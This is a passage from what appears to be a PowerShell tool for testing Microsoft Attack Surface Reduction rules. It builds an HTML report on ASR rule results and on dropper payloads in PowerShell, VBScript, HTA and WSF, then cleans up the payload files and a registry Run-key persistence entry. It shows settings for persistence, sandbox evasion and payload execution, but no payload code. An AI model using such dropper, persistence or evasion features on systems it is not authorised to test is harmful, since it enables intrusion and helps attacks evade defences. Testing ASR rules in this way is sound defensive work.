        .passive {
            color: #95a5a6;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #f2f2f2;
            font-weight: bold;
        }
        tr:hover {
            background-color: #f5f5f5;
        }
        .result-cell {
            font-weight: bold;
        }
        .terminal {
            background: #2c3e50;
            color: #ecf0f1;
            font-family: 'Consolas', 'Courier New', monospace;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 10px 0;
            white-space: pre-wrap;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }
        .badge-standard {
            background-color: #3498db;
            color: white;
        }
        .badge-triggered {
            background-color: #2ecc71;
            color: white;
        }
        .badge-not-triggered {
            background-color: #e74c3c;
            color: white;
        }
        .badge-skipped {
            background-color: #95a5a6;
            color: white;
        }
        .badge-error {
            background-color: #c0392b;
            color: white;
        }
        .badge-blocked {
            background-color: #8e44ad;
            color: white;
        }
        .badge-audit {
            background-color: #f39c12;
            color: white;
        }
        .badge-not-configured {
            background-color: #7f8c8d;
            color: white;
        }
        .section-toggle {
            cursor: pointer;
            user-select: none;
        }
        .section-toggle:hover {
            color: #3498db;
        }
        .section-toggle::after {
            content: ' v';
            font-size: 0.8em;
        }
        .section-toggle.collapsed::after {
            content: ' >';
        }
        .collapsible {
            display: block;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }
        .collapsible.collapsed {
            max-height: 0;
        }
        .config-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #eee;
        }
        .config-value {
            font-weight: bold;
        }
        .chart-container {
            height: 300px;
            margin: 20px 0;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #ddd;
            font-size: 0.9em;
            color: #7f8c8d;
        }
        .tab {
            overflow: hidden;
            border: 1px solid #ccc;
            background-color: #f1f1f1;
            border-radius: 5px 5px 0 0;
        }
        .tab button {
            background-color: inherit;
            float: left;
            border: none;
            outline: none;
            cursor: pointer;
            padding: 14px 16px;
            transition: 0.3s;
            font-size: 16px;
        }
        .tab button:hover {
            background-color: #ddd;
        }
        .tab button.active {
            background-color: white;
            border-bottom: 2px solid #3498db;
        }
        .tabcontent {
            display: none;
            padding: 20px;
            border: 1px solid #ccc;
            border-top: none;
            animation: fadeEffect 1s;
            border-radius: 0 0 5px 5px;
            background-color: white;
        }
        @keyframes fadeEffect {
            from {opacity: 0;}
            to {opacity: 1;}
        }
        .log-viewer {
            max-height: 400px;
            overflow-y: auto;
        }
        .type-badge {
            display: inline-block;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
            margin-right: 5px;
        }
        .type-ps {
            background-color: #2980b9;
            color: white;
        }
        .type-vbs {
            background-color: #27ae60;
            color: white;
        }
        .type-hta {
            background-color: #8e44ad;
            color: white;
        }
        .type-wsf {
            background-color: #f39c12;
            color: white;
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>ASR Dropper and Rules Testing Report</h1>
        </div>
        <div class="header-right">
            <p><strong>Generated:</strong> $timestamp</p>
            <p><strong>Location:</strong> $DropPath</p>
        </div>
    </div>

    <div class="tab">
        <button class="tablinks active" onclick="openTab(event, 'Summary')">Summary</button>
        <button class="tablinks" onclick="openTab(event, 'ASRRules')">ASR Rules Testing</button>
        <button class="tablinks" onclick="openTab(event, 'Payloads')">Dropper Payloads</button>
        <button class="tablinks" onclick="openTab(event, 'Logs')">Execution Logs</button>
        <button class="tablinks" onclick="openTab(event, 'Configuration')">Configuration</button>
    </div>

    <div id="Summary" class="tabcontent" style="display: block;">
        <div class="container">
            <h2>Test Summary</h2>
            <div class="summary">
                <div class="summary-box">
                    <h3>Payloads</h3>
                    <p><strong>Created:</strong> $($allPayloads.Count)</p>
                    <p><strong>Executed:</strong> $(if ($Execute) { "Yes" } else { "No" })</p>
                    <p><strong>Success:</strong> $(($results | Where-Object { $_.Success }).Count) / $($results.Count)</p>
                </div>
                <div class="summary-box">
                    <h3>ASR Rules</h3>
                    <p><strong>Tested:</strong> $(if ($TestASR) { $($asrResults.Count) } else { "No" })</p>
                    <p><strong>Triggered:</strong> $(($asrResults | Where-Object { $_.TestState -eq "Triggered" }).Count)</p>
                    <p><strong>Standard Rules:</strong> $(($asrResults | Where-Object { $_.Standard -eq $true }).Count)</p>
                </div>
                <div class="summary-box">
                    <h3>Configuration</h3>
                    <p><strong>Persistence:</strong> $(if ($Persist) { "Enabled" } else { "Disabled" })</p>
                    <p><strong>Cleanup:</strong> $(if ($Cleanup) { "Enabled" } else { "Disabled" })</p>
                    <p><strong>Sandbox Evasion:</strong> $(if ($Evasion) { "Enabled" } else { "Disabled" })</p>
                </div>
                <div class="summary-box">
                    <h3>Payload Types</h3>
                    <p><strong>PowerShell:</strong> $(($results | Where-Object { $_.Type -eq "PowerShell" }).Count)</p>
                    <p><strong>VBScript:</strong> $(($results | Where-Object { $_.Type -eq "VBScript" }).Count)</p>
                    <p><strong>HTA:</strong> $(($results | Where-Object { $_.Type -eq "HTA" }).Count)</p>
                    <p><strong>WSF:</strong> $(($results | Where-Object { $_.Type -eq "WSF" }).Count)</p>
                </div>
            </div>
        </div>
    </div>

    <div id="ASRRules" class="tabcontent">
        <div class="container">
            <h2>Attack Surface Reduction Rules Testing</h2>
"@

    if ($TestASR -and $asrResults.Count -gt 0) {
        $standardRules = $asrResults | Where-Object { $_.Standard -eq $true }
        $otherRules = $asrResults | Where-Object { $_.Standard -eq $false }
        
        # Add Standard Rules section
        if ($standardRules.Count -gt 0) {
            $html += @"
            <h3 class="section-toggle">Standard Protection Rules ($($standardRules.Count))</h3>
            <div class="collapsible">
                <table>
                    <thead>
                        <tr>
                            <th>Rule Name</th>
                            <th>Rule ID</th>
                            <th>Category</th>
                            <th>Current State</th>
                            <th>Test Result</th>
                            <th>Details</th>
                        </tr>
                    </thead>
                    <tbody>
"@
            foreach ($rule in $standardRules) {
                $stateClass = switch ($rule.CurrentState) {
                    "1" { "badge-blocked" }
                    "2" { "badge-audit" }
                    "6" { "badge-audit" }
                    default { "badge-not-configured" }
                }
                
                $stateText = switch ($rule.CurrentState) {
                    "1" { "Block" }
                    "2" { "Audit" }
                    "6" { "Warn" }
                    default { "Not Configured" }
                }
                
                $resultClass = switch ($rule.TestState) {
                    "Triggered" { "badge-triggered" }
                    "Not Triggered" { "badge-not-triggered" }
                    "Skipped" { "badge-skipped" }
                    "Error" { "badge-error" }
                    default { "badge-skipped" }
                }
                
                $html += @"
                        <tr>
                            <td>$($rule.RuleName) <span class="badge badge-standard">Standard</span></td>
                            <td><code>$($rule.RuleId)</code></td>
                            <td>$($rule.Category)</td>
                            <td><span class="badge $stateClass">$stateText</span></td>
                            <td><span class="badge $resultClass">$($rule.TestState)</span></td>
                            <td>$($rule.TestDetails)</td>
                        </tr>
"@
            }
            $html += @"
                    </tbody>
                </table>
            </div>
"@
        }
        
        # Add Other Rules section
        if ($otherRules.Count -gt 0) {
            $html += @"
            <h3 class="section-toggle">Other Protection Rules ($($otherRules.Count))</h3>
            <div class="collapsible">
                <table>
                    <thead>
                        <tr>
                            <th>Rule Name</th>
                            <th>Rule ID</th>
                            <th>Category</th>
                            <th>Current State</th>
                            <th>Test Result</th>
                            <th>Details</th>
                        </tr>
                    </thead>
                    <tbody>
"@
            foreach ($rule in $otherRules) {
                $stateClass = switch ($rule.CurrentState) {
                    "1" { "badge-blocked" }
                    "2" { "badge-audit" }
                    "6" { "badge-audit" }
                    default { "badge-not-configured" }
                }
                
                $stateText = switch ($rule.CurrentState) {
                    "1" { "Block" }
                    "2" { "Audit" }
                    "6" { "Warn" }
                    default { "Not Configured" }
                }
                
                $resultClass = switch ($rule.TestState) {
                    "Triggered" { "badge-triggered" }
                    "Not Triggered" { "badge-not-triggered" }
                    "Skipped" { "badge-skipped" }
                    "Error" { "badge-error" }
                    default { "badge-skipped" }
                }
                
                $html += @"
                        <tr>
                            <td>$($rule.RuleName)</td>
                            <td><code>$($rule.RuleId)</code></td>
                            <td>$($rule.Category)</td>
                            <td><span class="badge $stateClass">$stateText</span></td>
                            <td><span class="badge $resultClass">$($rule.TestState)</span></td>
                            <td>$($rule.TestDetails)</td>
                        </tr>
"@
            }
            $html += @"
                    </tbody>
                </table>
            </div>
"@
        }
        
        # Add Chart for rule results
        $triggeredCount = ($asrResults | Where-Object { $_.TestState -eq "Triggered" }).Count
        $notTriggeredCount = ($asrResults | Where-Object { $_.TestState -eq "Not Triggered" }).Count
        $skippedCount = ($asrResults | Where-Object { $_.TestState -eq "Skipped" }).Count
        $errorCount = ($asrResults | Where-Object { $_.TestState -eq "Error" }).Count
        
        $html += @"
            <h3>Test Results Overview</h3>
            <div class="chart-container">
                <canvas id="rulesChart"></canvas>
            </div>
"@
    }
    else {
        $html += @"
            <div class="terminal">
                ASR Rules testing was not enabled or no rules were selected.
                Enable ASR Rules testing from the main menu option [A] to see results here.
            </div>
"@
    }
    
    $html += @"
        </div>
    </div>

    <div id="Payloads" class="tabcontent">
        <div class="container">
            <h2>Dropper Payloads</h2>
"@

    if ($results.Count -gt 0) {
        $html += @"
            <table>
                <thead>
                    <tr>
                        <th>Type</th>
                        <th>Name</th>
                        <th>Path</th>
                        <th>Result</th>
                    </tr>
                </thead>
                <tbody>
"@
        foreach ($r in $results) {
            $resultClass = if ($r.Success) { "success" } else { "danger" }
            $resultText = if ($r.Success) { "Success" } else { "Failed" }
            if (-not $Execute) {
                $resultClass = "passive"
                $resultText = "Not Executed"
            }
            
            $typeBadgeClass = switch ($r.Type) {
                "PowerShell" { "type-ps" }
                "VBScript" { "type-vbs" }
                "HTA" { "type-hta" }
                "WSF" { "type-wsf" }
                default { "type-ps" }
            }
            
            $html += @"
                    <tr>
                        <td><span class="type-badge $typeBadgeClass">$($r.Type)</span></td>
                        <td>$($r.Name)</td>
                        <td>$($r.Path)</td>
                        <td class="$resultClass">$resultText</td>
                    </tr>
"@
        }
        $html += @"
                </tbody>
            </table>
            
            <h3 class="section-toggle">Payload Details</h3>
            <div class="collapsible">
"@
        foreach ($r in $results) {
            $html += @"
                <h4>$($r.Name) <span class="type-badge $typeBadgeClass">$($r.Type)</span></h4>
                <p><strong>Path:</strong> $($r.Path)</p>
                <div class="terminal">$($r.Output)</div>
"@
        }
        $html += @"
            </div>
"@
    }
    else {
        $html += @"
            <div class="terminal">
                No payload results available.
            </div>
"@
    }
    
    $html += @"
        </div>
    </div>

    <div id="Logs" class="tabcontent">
        <div class="container">
            <h2>Execution Logs</h2>
            <p>Detailed logs of the execution process:</p>
            
            <div class="log-viewer terminal">
"@

    # Add log content if available
    if (Test-Path (Join-Path $DropPath $LogFile)) {
        $logContent = Get-Content -Path (Join-Path $DropPath $LogFile) -ErrorAction SilentlyContinue
        foreach ($line in $logContent) {
            $html += "$line`n"
        }
    } else {
        $html += "No log file found at: $(Join-Path $DropPath $LogFile)"
    }

    $html += @"
            </div>
        </div>
    </div>

    <div id="Configuration" class="tabcontent">
        <div class="container">
            <h2>Test Configuration</h2>
            
            <h3>Dropper Settings</h3>
            <div class="config-item">
                <span>Execute Payloads:</span>
                <span class="config-value">$(if ($Execute) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Generate HTML Report:</span>
                <span class="config-value">$(if ($LogHtml) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Enable Persistence:</span>
                <span class="config-value">$(if ($Persist) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Create .lnk Shortcut:</span>
                <span class="config-value">$(if ($CreateShortcut) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Cleanup After Execution:</span>
                <span class="config-value">$(if ($Cleanup) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Include Signature Strings:</span>
                <span class="config-value">$(if ($Signatures) { "Yes" } else { "No" })</span>
            </div>
            <div class="config-item">
                <span>Sandbox Evasion:</span>
                <span class="config-value">$(if ($Evasion) { "Yes" } else { "Disabled" })</span>
            </div>
            <div class="config-item">
                <span>External Process:</span>
                <span class="config-value">$ExternalProcess</span>
            </div>
            
<h3>Payload Type Configuration</h3>
            <div class="config-item">
                <span>PowerShell Script (.ps1):</span>
                <span class="config-value">$(if ($UsePS1Payload) { "Enabled" } else { "Disabled" })</span>
            </div>
            <div class="config-item">
                <span>VBScript (.vbs):</span>
                <span class="config-value">$(if ($UseVBSPayload) { "Enabled" } else { "Disabled" })</span>
            </div>
            <div class="config-item">
                <span>Windows Script File (.wsf):</span>
                <span class="config-value">$(if ($UseWSFPayload) { "Enabled" } else { "Disabled" })</span>
            </div>
            
            <h3>ASR Rules Testing</h3>
            <div class="config-item">
                <span>Test ASR Rules:</span>
                <span class="config-value">$(if ($TestASR) { "Enabled" } else { "Disabled" })</span>
            </div>
            <div class="config-item">
                <span>Selected Rules:</span>
                <span class="config-value">$($SelectedASRRules.Count)</span>
            </div>
"@

    if ($SelectedASRRules.Count -gt 0) {
        $html += @"
            <div class="config-item">
                <span>Rule IDs:</span>
                <span class="config-value">
                <ul style="list-style-type: none; padding-left: 0; margin: 0;">
"@
        foreach ($ruleId in $SelectedASRRules) {
            $rule = $ASRRules | Where-Object { $_.Id -eq $ruleId }
            if ($rule) {
                $html += @"
                <li>$($rule.Name): <code>$($rule.Id)</code></li>
"@
            }
        }
        
        $html += @"
                </ul>
                </span>
            </div>
"@
    }

    $html += @"
            
            <h3>Logging Configuration</h3>
            <div class="config-item">
                <span>Verbose Logging:</span>
                <span class="config-value">$(if ($VerboseLogging) { "Enabled" } else { "Disabled" })</span>
            </div>
            <div class="config-item">
                <span>Log File:</span>
                <span class="config-value">$LogFile</span>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>ASR Multi-Vector Dropper Tool v1.1 | Generated on $timestamp</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.1/dist/chart.min.js"></script>
    <script>
        // Tab functionality
        function openTab(evt, tabName) {
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }
        
        // Collapsible sections
        document.addEventListener('DOMContentLoaded', function() {
            var toggles = document.getElementsByClassName('section-toggle');
            for (var i = 0; i < toggles.length; i++) {
                toggles[i].addEventListener('click', function() {
                    this.classList.toggle('collapsed');
                    var content = this.nextElementSibling;
                    content.classList.toggle('collapsed');
                });
            }
        });
        
        // Charts
        document.addEventListener('DOMContentLoaded', function() {
            var rulesChart = document.getElementById('rulesChart');
            if (rulesChart) {
                new Chart(rulesChart, {
                    type: 'pie',
                    data: {
                        labels: ['Triggered', 'Not Triggered', 'Skipped', 'Error'],
                        datasets: [{
                            data: [$triggeredCount, $notTriggeredCount, $skippedCount, $errorCount],
                            backgroundColor: [
                                '#2ecc71',
                                '#e74c3c',
                                '#95a5a6',
                                '#c0392b'
                            ]
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: {
                            legend: {
                                position: 'right',
                            },
                            title: {
                                display: true,
                                text: 'ASR Rules Test Results'
                            }
                        }
                    }
                });
            }
            
            // Add a pie chart for payload types
            var payloadTypesChart = document.getElementById('payloadTypesChart');
            if (payloadTypesChart) {
                new Chart(payloadTypesChart, {
                    type: 'pie',
                    data: {
                        labels: ['PowerShell', 'VBScript', 'HTA', 'WSF'],
                        datasets: [{
                            data: [
                                $(($results | Where-Object { $_.Type -eq "PowerShell" }).Count),
                                $(($results | Where-Object { $_.Type -eq "VBScript" }).Count),
                                $(($results | Where-Object { $_.Type -eq "HTA" }).Count),
                                $(($results | Where-Object { $_.Type -eq "WSF" }).Count)
                            ],
                            backgroundColor: [
                                '#2980b9',
                                '#27ae60',
                                '#8e44ad',
                                '#f39c12'
                            ]
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: {
                            legend: {
                                position: 'right',
                            },
                            title: {
                                display: true,
                                text: 'Payload Types'
                            }
                        }
                    }
                });
            }
        });
    </script>
</body>
</html>
"@

    # Save HTML report
    Set-Content $logPath $html -Encoding UTF8
    Write-Log "HTML report saved to: $logPath" -Level SUCCESS
    
    # Ask if user wants to open the report now
    $openReport = Read-Host "Open HTML report now? (y/n)"
    if ($openReport -eq "y") {
        Write-Log "Opening HTML report" -Level INFO
        Start-Process $logPath
    } else {
        Write-Log "HTML report saved. User chose not to open it now." -Level INFO
    }
}

# === Cleanup
if ($Cleanup) {
    Write-Log "Starting cleanup process" -Level INFO
    
    # Only remove files in the Public folder that were created by this script
    $createdFiles = @()
    
    # Add all payload files to the list
    foreach ($p in $allPayloads) {
        $createdFiles += $p.Path
    }
    
    # Add shortcut if created
    if ($CreateShortcut) { 
        $createdFiles += "$DropPath\loader.lnk" 
    }
    
    # Process each file
    foreach ($file in $createdFiles) {
        if (Test-Path $file) {
            try {
                Remove-Item -Path $file -Force
                Write-Log "Removed: $file" -Level SUCCESS
            } catch {
                Write-Log "Failed to remove: $file - $($_.Exception.Message)" -Level ERROR
            }
        } else {
            Write-Log "File not found during cleanup: $file" -Level WARNING
        }
    }
    
    # Remove registry persistence
    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" -ErrorAction SilentlyContinue
        Write-Log "Removed registry persistence" -Level SUCCESS
    } catch {
        Write-Log "Failed to remove registry persistence: $($_.Exception.Message)" -Level ERROR
    }
    
    Write-Log "Cleanup complete" -Level SUCCESS
} else {
    Write-Log "Dropper execution complete" -Level SUCCESS
    Write-Log "Files created in: $DropPath" -Level INFO
    
    if ($Persist) { 
        Write-Log "WARNING: Persistence mechanisms enabled and will remain active" -Level WARNING
    }
    
    if ($LogHtml) { 
        Write-Log "HTML report saved to: $logPath" -Level INFO
    }
    
    if (-not $Execute) { 
        Write-Log "Payloads were generated but not executed (toggle Execute to run)" -Level INFO
    }
}

Write-Host "`n[COMPLETE] ASRDropper script execution finished." -ForegroundColor Green
Write-Host "Check the log file for detailed execution information: $(Join-Path $DropPath $LogFile)" -ForegroundColor Cyan